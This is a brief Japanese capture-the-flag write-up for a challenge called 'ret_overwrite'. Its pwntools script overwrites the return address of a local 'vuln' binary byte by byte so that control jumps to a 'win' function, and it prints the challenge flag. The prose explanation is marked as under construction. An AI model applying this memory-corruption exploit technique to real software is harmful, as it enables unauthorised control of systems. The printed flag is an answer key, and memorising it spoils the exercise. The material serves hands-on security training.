# ret_overwrite
リターンアドレスを書き替えましょう!


## Write up
```
from pwn import *

io = process("./vuln")
elf = ELF("./vuln")

win = hex(elf.symbols["win"])
print(win)

io.recvuntil(b"type index>")
io.sendline(b"18")
io.recvuntil(b"type value in hex>")
io.sendline(bytes(win[-2:], 'utf-8'))

io.recvuntil(b"type index>")
io.sendline(b"19")
io.recvuntil(b"type value in hex>")
io.sendline(bytes(win[-4:-2], 'utf-8'))

io.interactive()
```


工事中

```
flag{0VeRWitE_T4E_RET4DDRESS!!}
```